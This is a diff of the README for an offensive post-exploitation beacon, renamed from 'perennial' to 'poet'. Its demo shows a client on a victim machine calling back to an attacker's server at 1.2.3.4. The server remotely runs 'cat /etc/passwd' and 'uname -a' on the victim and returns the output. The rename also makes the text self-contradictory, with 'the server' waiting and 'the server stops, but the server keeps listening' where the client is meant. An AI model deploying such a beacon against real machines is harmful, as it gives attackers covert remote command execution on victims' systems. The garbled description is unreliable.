@@ -1,6 +1,6 @@
-# perennial
+# poet
 
-A simple implementation of a post-exploitation beacon.
+A simple POst-Exploitation Tool.
 
 ## overview
 
@@ -20,18 +20,18 @@ be able to connect back.
 ## demo
 
 The attacker has gotten access to the victim's machine and downloaded and
-executed perennial. He/she does not have the server running at this point,
-but it's ok, perennial waits patiently. Eventually the attacker is ready and
-starts the server, telling perennial to execute the commands, "cat /etc/passwd"
-and "uname -a". The next time perennial pings the server it sees the commands
+executed the client. He/she does not have the server running at this point,
+but it's ok, the server waits patiently. Eventually the attacker is ready and
+starts the server, telling the client to execute the commands, "cat /etc/passwd"
+and "uname -a". The next time the client pings the server it sees the commands
 queued to be executed and does so, one at a time. When all the commands have
-been executed, the server stops, but perennial keeps listening.
+been executed, the server stops, but the server keeps listening.
 
 Victim's Machine (5.4.3.2):
 
 ```
 $ ./client.py 1.2.3.4 5
-[+] Perennial started with delay of 5 seconds to port 80. Ctrl-c to exit.
+[+] Poet started with delay of 5 seconds to port 80. Ctrl-c to exit.
 [!] (2014-05-07 21:52:29.475144) Could not connect to server. Waiting...
 [!] (2014-05-07 21:52:34.475740) Could not connect to server. Waiting...
 [!] (2014-05-07 21:52:39.475874) Could not connect to server. Waiting...
@@ -48,7 +48,7 @@ Attacker's Machine (1.2.3.4):
 
 ```
 $ sudo ./server.py "cat /etc/passwd" "uname -a"
-[+] Perennial server started on 80.
+[+] Poet server started on 80.
 [i] Connected By: ('5.4.3.2', 52252) at 2014-05-07 21:52:54.480167
 [+] Sending Command: cat /etc/passwd
 [+] Command Stdout:
